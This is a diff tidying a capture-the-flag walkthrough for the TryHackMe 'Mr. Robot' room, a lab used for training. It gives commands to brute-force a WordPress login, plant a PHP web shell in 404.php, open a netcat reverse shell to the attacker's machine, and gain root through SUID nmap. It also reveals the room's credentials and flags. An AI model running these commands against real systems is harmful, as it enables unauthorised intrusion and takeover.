@@ -1,8 +1,8 @@
 # 🤖 TryHackMe: Mr. Robot
 
-> Difficulty: Medium  
-> IP: `10.10.X.X` (use the one from THM)  
-> Tags: `Web`, `Enumeration`, `WordPress`, `Privilege Escalation`
+> **Difficulty:** Medium  
+> **IP:** `10.10.X.X` (replace with actual THM IP)  
+> **Tags:** `Web`, `Enumeration`, `WordPress`, `Privilege Escalation`
 
 ---
 
@@ -12,139 +12,105 @@
 
 ```bash
 nmap -sC -sV -oN mrrobot.nmap 10.10.X.X
-pgsql
-Copy
-Edit
+Result:
+
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 6.6.1p1
 80/tcp open  http    Apache httpd
-Apache is running on port 80. Let's explore it in a browser.
+Apache is running on port 80. Let’s explore it in a browser.
 
 🌐 2. Web Enumeration
-Homepage reveals a Mr. Robot-style website.
+The homepage resembles the Mr. Robot TV show site.
 
-📄 Check for robots.txt
-bash
-Copy
-Edit
+📄 Check robots.txt
+
 curl http://10.10.X.X/robots.txt
-makefile
-Copy
-Edit
 User-agent: *
 fsocity.dic
 key-1-of-3.txt
 fsocity.dic: A wordlist
 
-key-1-of-3.txt: First flag!
+key-1-of-3.txt: First flag
 
-bash
-Copy
-Edit
 curl http://10.10.X.X/key-1-of-3.txt
 ✅ Found first flag!
 
 🧰 3. Directory Brute Forcing
 Use gobuster with the discovered wordlist:
 
-bash
-Copy
-Edit
 gobuster dir -u http://10.10.X.X -w fsocity.dic -t 50
-Found /wp-login.php → WordPress login
+Discovered: /wp-login.php → WordPress login page
 
-🔑 4. WordPress Login Bruteforce
-Use hydra or wpscan:
+🔑 4. WordPress Login Brute-force
+Use hydra or wpscan to brute-force the credentials:
 
-bash
-Copy
-Edit
 hydra -l elliot -P fsocity.dic 10.10.X.X http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid"
-✅ Got credentials:
+✅ Credentials found:
 
 Username: elliot
 
 Password: ER28-0652
 
-Login to http://10.10.X.X/wp-login.php.
+Login at: http://10.10.X.X/wp-login.php
 
 🐚 5. Getting a Shell
-Inside WordPress → Appearance → Editor → modify 404.php to include a PHP reverse shell.
+Go to:
+Appearance → Theme Editor → 404.php
 
-php
-Copy
-Edit
+Insert a PHP reverse shell:
+
 <?php system($_GET['cmd']); ?>
 Now trigger the shell:
 
-bash
-Copy
-Edit
 curl "http://10.10.X.X/wp-content/themes/twentyfifteen/404.php?cmd=nc -e /bin/bash YOUR-IP 4444"
 Start listener:
 
-bash
-Copy
-Edit
 nc -lvnp 4444
-✅ Shell obtained as daemon user.
+✅ Got reverse shell as daemon user
 
 ⬆️ 6. Privilege Escalation
 📁 Check for second flag
-bash
-Copy
-Edit
 find / -name "key-2-of-3.txt" 2>/dev/null
-Found inside robot user’s home, but protected.
+Found inside robot user’s home but not accessible.
 
-bash
-Copy
-Edit
-su robot
-Try password reuse from WordPress or bruteforce:
+🔐 Switch to robot user
+Try password reuse or crack using john:
 
-bash
-Copy
-Edit
 john --wordlist=fsocity.dic password.raw
-✅ Cracked password → abcdefghijklmnopqrstuvwxyz
+✅ Password cracked: abcdefghijklmnopqrstuvwxyz
 
-bash
-Copy
-Edit
 su robot
 ✔️ Access granted
 ✔️ Second flag obtained
 
 🏁 7. Root Access
-bash
-Copy
-Edit
+🔍 Check for SUID binaries:
+
 find / -perm -4000 2>/dev/null
-Found nmap SUID.
+Found: nmap with SUID permissions
 
-Run interactive shell via:
+🔓 Exploit using nmap interactive shell:
 
-bash
-Copy
-Edit
 nmap --interactive
-> !sh
+Inside interactive shell:
+
+!sh
 ✅ Got root shell
 ✅ Found key-3-of-3.txt
 
 🧠 Lessons Learned
-Always check robots.txt and use discovered wordlists
+robots.txt often leaks useful files
 
-WordPress login brute force with username guessing
+Custom wordlists can lead to login credentials
 
-Reverse shell via 404.php injection
+PHP reverse shell injection via theme editor is effective
 
-Privilege escalation using nmap SUID trick
+Look for SUID binaries for easy privilege escalation
 
 🏆 Flags
-key-1-of-3: ✅
+Flag	Status
+key-1-of-3.txt	✅
+key-2-of-3.txt	✅
+key-3-of-3.txt	✅
 
-key-2-of-3: ✅
-
-key-3-of-3: ✅
+---
